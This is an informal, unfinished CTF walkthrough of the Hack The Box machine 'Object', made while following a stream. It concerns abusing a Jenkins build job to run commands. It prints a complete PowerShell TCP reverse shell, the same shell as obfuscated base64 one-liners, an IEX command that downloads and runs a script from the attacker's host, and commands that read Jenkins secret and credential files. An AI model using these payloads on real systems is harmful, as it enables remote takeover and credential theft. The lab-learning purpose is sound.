# Object Helped-Through

Name: Object
Date:  12/2/2023
Difficulty:  Hard
Goals:  
- Have fun and keep my head in AD hacking and Impacket etched slightly in my brain.
- Comment atleast once per section about Azure AD to revise
- Finish other Boxes and BRs again.
Learnt:
Beyond Root:
- Windows AD Patching
- Test my Windows Battleground/KOTH and invent another

As I have not looked into Azure AD in about month as I near doing the AZ-104 exam before getting back into OSCP after clearing up my Github, I still think that some of my efforts are never wasted having fun and relaxed hacking of a HTB box with Alh4zr3d. Although it seems to span out my additional work load, I am getting through some infrastructure issues that are just do or die in OSCP exam related scenarios that need to be worked through. With AZ-104 I am a less enthused to setup FTP and docker services to finish [[Kotarak-Helped-Through]] and [[Seventeen-Helped-Through]], which I will finish also today, but I a am side channel attacking them with focus being fun, AZ-104 and its relveance to AD. It is also the real-world AD I would face as a cloud admin or pentester or red/purple/blue teamer. Given that this is a 5 hour machine minus probably 50 minutes for the breaks Al will take and the introductionary setup I can get execise and get my other boxes service blockages sorted before finishing those. I am also getting to the point were I think with enough preparation I could atleast do KOTH against people panicing that maybe half as good as my given preparation and thought. I would like to have some more cool tricks for people that are way better than me to atleast stand some degree of a chance to not burn out on doing a couple a week after my OSCP. Stress conditioning seems like the way to go as I would like to work in high stress environments and be very very chill, but also be somewhat battle tested against talented people even if I lose.

## Recon

A brief look at Al and the length of this stream may indicate some serious malding. The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](Screenshots/ping.png)

With all the standard recon scannning done ahead of time I am more following along adding to my other beyond roots.
![](rootweb.png)

Add the hostname to /etc/hosts
```bash
echo "10.129.96.147 object.htb" | sudo tee -a /etc/hosts 
```

![](jenkins.png)


Create a account
![](createajenkins.png)


[Jenkins](https://www.jenkins.io/)  – an open source automation server which enables developers around the world to reliably build, test, and deploy their software.  [Jenkins](https://en.wikipedia.org/wiki/Jenkins_(software)) is an open source automation server. It helps automate the parts of software development related to building, testing, and deploying, facilitating continuous integration and continuous delivery. It is a server-based system that runs in servlet containers such as Apache Tomcat.

`Daashboard -> Create a job `

Automated Build pipelines,  CICD
`/Script` endpoint is script console - execute a reverse shell

We required to Web PrivEsc to access this functionality

![](fuffthesubdomain.png)

[Exploitdb](https://www.exploit-db.com/exploits/46572) is vulnerablity for this version of Jenkins; this exploit did not show up in `Searchsploit` - tried the metasploit version - failed

Ping ourselves for the PoC
![](pingourselvesforthepoc.png)

It runs , but fails
![](itdoesrun.png)

Console output is good.
![1080](oliverhasnossh.png)
User - ` Oliver :`; then I added `cmd /c`  to the ping command and change to a batch command. It failed as I `-c` requires administrative privileges! WHY!?!

![](itdoesnotliktocount.png)
Fixing the -c
![](pocbyping.png)

Less Cthulu-esque filter evasion
```powershell
$a = New-Object System.Net.Sockets.TCPClient('10.10.14.139',31337);$b = $a.GetStream();[byte[]]$c = 0..65535|%{0};while(($i = $b.Read($c, 0, $c.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($c,0, $i);$f = (iex $d 2>&1 | Out-String );$g = $f + 'PS ' + (pwd).Path + '> ';$e = ([text.encoding]::ASCII).GetBytes($g);$b.Write($e,0,$e.Length);$b.Flush()};$a.Close()
# client -> a
# stream -> b
# bytes -> c
# data -> d
# sendbyte -> e
# sendback -> f
# sendback2 -> f2 -> g
```

```bash
# Al's
iconv -f ASCII -t UTF-16LE rshell.txt | base64 | tr -d "\n"
# Mine
iconv -f ASCII -t UTF-16LE rshell.txt | tr -d "\n" | base64 -w0 
```

```powershell
cmd /c powershell -nop -exec  bypass -w hidden -e JABhACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJwAxADAALgAxADAALgAxADQALgAxADMAOQAnACwAMwAxADMAMwA3ACkAOwAkAGIAIAA9ACAAJABhAC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABiAC4AUgBlAGEAZAAoACQAYwAsACAAMAAsACAAJABjAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZAAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABjACwAMAAsACAAJABpACkAOwAkAGYAIAA9ACAAKABpAGUAeAAgACQAZAAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAGcAIAA9ACAAJABmACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAGcAKQA7ACQAYgAuAFcAcgBpAHQAZQAoACQAZQAsADAALAAkAGUALgBMAGUAbgBnAHQAaAApADsAJABiAC4ARgBsAHUAcwBoACgAKQB9ADsAJABhAC4AQwBsAG8AcwBlACgAKQAAAA==
```
This failed for me:
![1080](runandfail.png)
Because of xml parsing. I did have a newline at the buttom of the script.

```powershell
cmd /c powershell -nop -exec  bypass -w hidden -e JABhACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJwAxADAALgAxADAALgAxADQALgAxADMAOQAnACwAMwAxADMANwApADsAJABiACAAPQAgACQAYQAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAYgAuAFIAZQBhAGQAKAAkAGMALAAgADAALAAgACQAYwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYwAsADAALAAgACQAaQApADsAJABmACAAPQAgACgAaQBlAHgAIAAkAGQAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABnACAAPQAgACQAZgAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABnACkAOwAkAGIALgBXAHIAaQB0AGUAKAAkAGUALAAwACwAJABlAC4ATABlAG4AZwB0AGgAKQA7ACQAYgAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYQAuAEMAbABvAHMAZQAoACkAAA==

```

Al wants to read firewall rules - not done this before on Windows! I pasued to try acouple of things 
![1080](addedbyjenkinssomehow.png)

We could upload a shell and execute in memory trick, but also encodeit in base64 and decoded it
```powershell
IEX(new-object system.net.webclient).downloadString(http://attackbox/IPT.ps1)
```
Encode 
```bash
iconv -f ASCII -t UTF-16LE psFileInfilAndExec.txt | tr -d "\n" | base64 -w0
SQBFAFgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAcwB5AHMAdABlAG0ALgBuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQAzADkALwBJAFAAVAAuAHAAcwAxACcAKQAA
```

Jenkin Windows Batch script execution
```powershell
cmd /c powershell -nop -exec bypass -w hidden -e SQBFAFgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAcwB5AHMAdABlAG0ALgBuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQAzADkALwBJAFAAVAAuAHAAcwAxACcAKQAA
```

I tried one argument and it complaint, tried two it complained again, went back 
![1080](wantedmoreargsbutstillfails.png)

Then I could not find my http server, which is really weird considering that we have PoC from the ping. I tried wget, not on the box, and curl is disabled
![](disabledinlibcurl.png)

From 1:35 to : is an awesome monolog about Stuxnet, Flame, Eternal Blue, 0days, APTs and Hacking the Planet. Al seems to be malding hard at the powershell.

Deskop App Web Viewer is allowed. The `(65536)` is the Ports that it has successful probed.
```powershell
Name                  : {EF6E166B-E36D-4D2B-8E04-FBFD6960428F}
DisplayName           : Desktop App Web Viewer
Description           : Desktop App Web Viewer
DisplayGroup          : Desktop App Web Viewer
Group                 : @{Microsoft.Win32WebViewHost_10.0.17763.1_neutral_neutral_cw5n1h2txyewy?ms-resource://Windows.W
                        in32WebViewHost/resources/DisplayName}
Enabled               : True
Profile               : Domain, Private, Public
Platform              : {6.2+}
Direction             : Inbound
Action                : Allow
EdgeTraversalPolicy   : Allow
LooseSourceMapping    : False
LocalOnlyMapping      : False
Owner                 : S-1-5-21-4088429403-1159899800-2753317549-500
PrimaryStatus         : OK
Status                : The rule was parsed successfully from the store. (65536)
EnforcementStatus     : NotApplicable
PolicyStoreSource     : PersistentStore
PolicyStoreSourceType : Local


Name                  : {C5A26574-EBAB-4E3C-ABE0-05A1B8F65E0C}
DisplayName           : Desktop App Web Viewer
Description           : Desktop App Web Viewer
DisplayGroup          : Desktop App Web Viewer
Group                 : @{Microsoft.Win32WebViewHost_10.0.17763.1_neutral_neutral_cw5n1h2txyewy?ms-resource://Windows.W
                        in32WebViewHost/resources/DisplayName}
Enabled               : True
Profile               : Domain, Private, Public
Platform              : {6.2+}
Direction             : Inbound
Action                : Allow
EdgeTraversalPolicy   : Allow
LooseSourceMapping    : False
LocalOnlyMapping      : False
Owner                 : S-1-5-21-4088429403-1159899800-2753317549-1106
PrimaryStatus         : OK
Status                : The rule was parsed successfully from the store. (65536)
EnforcementStatus     : NotApplicable
PolicyStoreSource     : PersistentStore
PolicyStoreSourceType : Local
```



Advanced Persistent Tears as `certutil` does not connect for the first time in as many boxes as I have done by now. Al is malding hard still.
![](AdvancedPersistentTears.png) 

`ls` thinking about the file system WebView is cameras
![](filesystem.png)

Nishang has a version [ICMP reverse shell](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1), but requires a python2 tool. Al is still malding from chat. [icmpdoor](https://github.com/krabelize/icmpdoor) loks cool though. Al is full mald by 2:16...then someone in the chat says he is not putting in the effort.  While Al vents I looked up 0xdf 

```powershell
powershell -c Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block 
```

```powershell
powershell -c "Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block |
Format-Table -Property 
DisplayName, 
@{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},
@{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}}, @{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},
@{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}},
Enabled,
Profile,
Direction,
Action"
```

```powershell
powershell -c "Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block | Format-Table -Property DisplayName,@{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},@{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}},@{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},@{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}}, Enabled, Profile,Direction,Action"

```

```powershell
powershell -c Get-NetFirewallRule -Direction Outbound -Enabled True -Action Allow
```
I will screenshot each level and be methodically while remember how emotions and tireness kill hacking.
![](firstlsup.png)

```powershell
type ../secret.key
type ../config.xml
type ../identity.key.enc
type ../jenkins.security.apitoken.ApiTokenPropertyConfiguration.xml
ls ../secrets
ls ../users
```


The reason I think this is kicker is that initial thought is reverse shell, upload, check connections
![](secondlsup.png)

Also I appreciate Al suffering and the powering through
![](thirdlsup.png)

Al powered through this machine like absolute hero deomnstrating awesome determination, excellent insights into real world goings on beyond scope of CTFs. 
![](forthlsup.png)

I am very glad he keeps streaming and very grateful.
![](groovybaby.png)

I know could have just targeted each directory by name, but for pure data handling
![](users.png)

The C:\\ 
![1080](cdrive.png)

Think Smart not Hard 
1. Check connection - ping , firewall rules
2. **Incrementally** read file system 
	1. Credentials
	2. File and Directory Permissions

```powershell
cmd /c powershell -c Get-Content -Path '../../secret.key'
cmd /c powershell -c Get-Content -Path '../../config.xml'
cmd /c powershell -c Get-Content -Path '../../identity.key.enc'
cmd /c powershell -c Get-Content -Path '../../jenkins.security.apitoken.ApiTokenPropertyConfiguration.xml'
cmd /c powershell -c ls '../../secrets'
cmd /c powershell -c ls '../../users'
```

Apperently someone modified the firewall rules which sound ultra beyond root material. Regardless
```
ac5757641b505503f44d2752ffa01e621bf5b935763ebc8adaa2e90cf85b13ac
```

We have a key, but no password in the config
![1080](seefsreadinglog.png)

But each user has a directory `admin_17207690984073220035` and there is a `master.key` amongst other data
```powershell
cmd /c powershell -c Get-Content -Path  ../../secrets/hudson.model.Job.serverCookie                                       
cmd /c powershell -c Get-Content -Path  ../../secrets/hudson.util.Secret                                                  
cmd /c powershell -c Get-Content -Path  ../../secrets/jenkins.model.Jenkins.crumbSalt                                     
cmd /c powershell -c Get-Content -Path  ../../secrets/master.key
cmd /c powershell -c ls  ../../users/admin_17207690984073220035
```

Results in a another config and more
![1080](otherconfigandmore.png)

Al goes quiet till but forwards the way with [hoto's jenkins decryptor](https://github.com/hoto/jenkins-credentials-decryptor)

Notes

https://github.com/gquere/pwn_jenkins
https://itluke.online/2018/11/27/how-to-display-firewall-rule-ports-with-powershell/
https://0xdf.gitlab.io/2022/02/28/htb-object.html#shell-as-oliver
https://github.com/theGuildHall/pwnbox - 



## Exploit

## Foothold

## PrivEsc

## Beyond Root

####  KOTH/BGs, Meta

I think the ultimate meta would be to KOTH logging and exfiltrating the logs monitoring the other attackers and defender action for the TTPs.

#### Powershell-For-Hackers

Checking out I-Am-Jackoby - https://github.com/I-Am-Jakoby/PowerShell-for-Hackers mentioned during the stream.

#### Modify a Firewall Rule

#### Ping Shell
